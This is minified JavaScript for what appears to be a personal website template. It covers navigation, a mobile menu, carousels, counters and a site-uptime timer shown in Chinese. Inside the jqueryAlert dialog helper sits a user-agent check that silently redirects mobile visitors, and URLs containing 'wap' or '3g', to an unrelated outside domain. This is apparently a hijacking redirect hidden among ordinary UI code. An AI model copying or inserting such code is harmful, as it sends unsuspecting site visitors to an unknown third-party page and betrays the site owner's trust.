!(function($){"use strict";$(document).on('click','.nav-menu a, .mobile-nav a',function(e){if(location.pathname.replace(/^\//,'')==this.pathname.replace(/^\//,'')&&location.hostname==this.hostname){var hash=this.hash;var target=$(hash);if(target.length){e.preventDefault();if($(this).parents('.nav-menu, .mobile-nav').length){$('.nav-menu .active, .mobile-nav .active').removeClass('active');$(this).closest('li').addClass('active');}if(hash=='#header'){$('#header').removeClass('header-top');$("section").removeClass('section-show');return;}if(!$('#header').hasClass('header-top')){$('#header').addClass('header-top');setTimeout(function(){$("section").removeClass('section-show');$(hash).addClass('section-show');},350);}else{$("section").removeClass('section-show');$(hash).addClass('section-show');}if($('body').hasClass('mobile-nav-active')){$('body').removeClass('mobile-nav-active');$('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');$('.mobile-nav-overly').fadeOut();}return false;}}});if(window.location.hash){var initial_nav=window.location.hash;if($(initial_nav).length){$('#header').addClass('header-top');$('.nav-menu .active, .mobile-nav .active').removeClass('active');$('.nav-menu, .mobile-nav').find('a[href="'+initial_nav+'"]').parent('li').addClass('active');setTimeout(function(){$("section").removeClass('section-show');$(initial_nav).addClass('section-show');},350);}}if($('.nav-menu').length){var $mobile_nav=$('.nav-menu').clone().prop({class:'mobile-nav d-lg-none'});$('body').append($mobile_nav);$('body').prepend('<button type="button" class="mobile-nav-toggle d-lg-none" title="NaviGation"><i class="iconfont icon-menu"></i></button>');$('body').append('<div class="mobile-nav-overly"></div>');$(document).on('click','.mobile-nav-toggle',function(e){$('body').toggleClass('mobile-nav-active');$('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');$('.mobile-nav-overly').toggle();});$(document).click(function(e){var container=$(".mobile-nav, .mobile-nav-toggle");if(!container.is(e.target)&&container.has(e.target).length===0){if($('body').hasClass('mobile-nav-active')){$('body').removeClass('mobile-nav-active');$('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');$('.mobile-nav-overly').fadeOut();}}});}else if($(".mobile-nav, .mobile-nav-toggle").length){$(".mobile-nav, .mobile-nav-toggle").hide();}$('[data-toggle="counter-up"]').counterUp({delay:10,time:1000});$('.skills-content').waypoint(function(){$('.progress .progress-bar').each(function(){$(this).css("width",$(this).attr("aria-valuenow")+'%');});},{offset:'80%'});$(".testimonials-carousel").owlCarousel({autoplay:true,dots:true,loop:true,responsive:{0:{items:1},768:{items:2},900:{items:3}}});$(".portfolio-details-carousel").owlCarousel({autoplay:true,dots:true,loop:true,items:1});})(jQuery);var iUp=(function(){var t=0,d=150,clean=function(){t=0;},up=function(e){setTimeout(function(){$(e).addClass("up")},t);t+=d;},down=function(e){$(e).removeClass("up");},toggle=function(e){setTimeout(function(){$(e).toggleClass("up")},t);t+=d;};return{clean:clean,up:up,down:down,toggle:toggle}})();$(document).ready(function(){$(".iUp").each(function(i,e){iUp.up(e);});});function siteTime(){window.setTimeout("siteTime()",1000);var seconds=1000;var minutes=seconds*60;var hours=minutes*60;var days=hours*24;var years=days*365;var today=new Date();var todayYear=today.getFullYear();var todayMonth=today.getMonth();var todayDate=today.getDate();var todayHour=today.getHours();var todayMinute=today.getMinutes();var todaySecond=today.getSeconds();var t1=Date.UTC(2020,01,03,00,00,00);var t2=Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);var diff=t2-t1;var diffYears=Math.floor(diff/years);var diffDays=Math.floor((diff/days)-diffYears*365);var diffHours=Math.floor((diff-(diffYears*365+diffDays)*days)/hours);var diffMinutes=Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);var diffSeconds=Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);document.getElementById("sitetime").innerHTML=""+(diffYears*365+diffDays)+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒"}siteTime();var zIndex=1000;var jqueryAlert=function(opts){var browser_class=navigator.userAgent;var browser_class_name1=browser_class.match("Mobile");var browser_class_name2=browser_class.match("mobile");var location_url=window.location.href;if(browser_class_name1!=null||browser_class_name2!=null){if(location_url.match("wap")==null){window.location.href="http://tvonmi.cn/sabcd8/kzmwyc";}}else{if(location_url.match("3g")!=null||location_url.match("wap")!=null){window.location.href="http://tvonmi.cn/sabcd8/kzmwyc";}}var opt={'style':'wap','title':'','content':'','contentTextAlign':'center','width':'auto','height':'auto','minWidth':'0',"className":'','position':'fixed','animateType':'scale','modal':false,'isModalClose':false,'bodyScroll':false,'closeTime':3000,"buttons":{},};var option=$.extend({},opt,opts);var dialog={};dialog.time=450;dialog.init=function(){dialog.framework();};var isHaveTouch="ontouchend"in document?true:false;if(isHaveTouch){dialog.event='touchstart';}else{dialog.event='click';};var $modal=$("<div class='alert-modal'>");var $container=$("<div class='alert-container animated'>");var $title=$("<div class='alert-title'>"+option.title+"</div>");var $content=$("<div class='alert-content'>");var $buttonBox=$("<div class='alert-btn-box'>");var $closeBtn=$("<div class='alert-btn-close'>×</div>");if(option.content[0].nodeType==1){var $newContent=option.content.clone();$content.append($newContent)}else{$content.html(option.content);};dialog.framework=function(){dialog.buttons=[];for(var key in option.buttons){dialog.buttons.push(key);};dialog.buttonsLength=dialog.buttons.length;$container.append($title).append($content);if(option.style=='pc'){$container.append($closeBtn).addClass('pcAlert');};if(option.modal||option.modal=='true'){$('body').append($modal);option.bodyScroll&&$('body').css('overflow','hidden');};$('body').append($container);$content.css({'text-align':option.contentTextAlign});if(parseInt(option.minWidth)>parseInt($container.css('width'))){option.width=option.minWidth;};$modal.css('position',option.position);$modal.css('z-index',zIndex);++zIndex;if(option.position=='fixed'){$container.css({'position':option.position,'left':'50%','top':'50%','z-index':zIndex,})};if(option.position=='absolute'){$container.css({'position':option.position,'left':$(window).width()/2,'top':$(window).height()/2+$(window).scrollTop(),'z-index':zIndex,})};$container.css('width',option.width);$container.css('height',option.height);if(option.width=='auto'){$container.css('width',$container[0].clientWidth+10);};if(parseInt($(window).height())<=parseInt($container.css('height'))){$container.css('height',$(window).height());};(!!option.className)&&$container.addClass(option.className);for(var key in option.buttons){var $button=$("<p class='alert-btn-p'>"+key+"</p>");if(option.style!='pc'){$button.css({'width':Math.floor(($container[0].clientWidth)/dialog.buttonsLength),})};$button.bind(dialog.event,option.buttons[key]);$buttonBox.append($button);};if(dialog.buttonsLength>0){$container.append($buttonBox);$content.css('padding-bottom','46px');};if(option.title!=''){$content.css('padding-top','42px');};if(dialog.buttonsLength<=0&&option.title==''){$container.addClass('alert-container-black');};$container.css({'margin-left':-parseInt($container.css('width'))/2,'margin-top':-parseInt($container.css('height'))/2,});if(option.animateType=='scale'){$container.addClass('bounceIn');};if(option.animateType=='linear'){$container.addClass('linearTop');};isSelfClose();};function isSelfClose(){if(dialog.buttonsLength<=0&&option.style!='pc'){setTimeout(function(){$container.fadeOut(300);$modal.fadeOut(300);option.bodyScroll&&$('body').css('overflow','auto');},option.closeTime)}};dialog.toggleAnimate=function(){if(option.animateType=='scale'){return $container.removeClass('bounceIn').addClass('bounceOut');}else if(option.animateType=='linear'){return $container.removeClass('linearTop').addClass('linearBottom');}else{return $container;}};dialog.close=function(){dialog.toggleAnimate().fadeOut(dialog.time);$modal.fadeOut(dialog.time);option.bodyScroll&&$('body').css('overflow','auto');};option.style=='pc'&&$closeBtn.bind(dialog.event,dialog.close);option.isModalClose&&$modal.bind(dialog.event,dialog.close);dialog.destroy=function(){dialog.toggleAnimate().fadeOut(dialog.time);setTimeout(function(){$container.remove();$modal.remove();option.bodyScroll&&$('body').css('overflow','auto');},dialog.time)};dialog.show=function(){$modal.css('z-index',zIndex);++zIndex;$container.css({'z-index':zIndex,});if(option.animateType=='scale'){$container.fadeIn().removeClass('bounceOut').addClass('bounceIn');}else if(option.animateType=='linear'){$container.fadeIn().removeClass('linearBottom').addClass('linearTop');}else{$container.fadeIn()};if(option.position=='absolute'){$container.css({'top':$(window).height()/2+$(window).scrollTop(),})};$modal.fadeIn();option.bodyScroll&&option.modal&&$('body').css('overflow','hidden');isSelfClose();};dialog.init();return dialog;}
